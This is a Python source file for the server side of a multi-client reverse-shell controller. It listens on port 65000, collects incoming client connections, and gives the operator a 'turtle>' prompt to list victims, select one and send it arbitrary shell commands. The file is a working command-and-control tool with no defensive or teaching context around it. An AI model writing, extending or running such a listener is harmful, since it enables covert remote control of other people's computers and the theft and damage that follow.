import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
socket_lock = threading.Lock()  # Add a lock for thread safety
stop_flag = threading.Event()
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 65000
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        time.sleep(1)
        bind_socket()

def end_connections():
    print("\nServer is shutting down...")
    stop_flag.set()
    with socket_lock:
        for c in all_connections:
            try:
                c.close()
            except socket.error as e:
                print(f"Error closing socket: {e}")

        global s
        try:
            s.close()
        except socket.error as e:
            print(f"Error closing server socket: {e}")
    sys.exit(0)



def accepting_connections():
    while not stop_flag.is_set():
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            with socket_lock:
                all_connections.append(conn)
                all_address.append(address)

            print("Connection has been established: " + address[0])
        except socket.error as e:
            if not stop_flag.is_set():
                print("Socket error while accepting connections: " + str(e))
            break
        except Exception as e:
            print("General error while accepting connections: " + str(e))
            break


def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'exit()' or cmd == 'exit':
            end_connections()
            break
        elif cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'help':
            help()
        else:
            print("Command not recognized")

def list_connections():
    results = ''
    with socket_lock:
        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except socket.error:
                del all_connections[i]
                del all_address[i]
                continue

            results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except Exception as e:
        print("Selection not valid: " + str(e))
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input("turtle> ")
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                with socket_lock:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
        except socket.error as e:
            print(f"Error sending commands: {e}")
            break

def create_workers():
    try:
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=work)
            t.daemon = True
            t.start()
    except Exception as e:
        print("Error creating worker threads: " + str(e))
        end_connections()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()
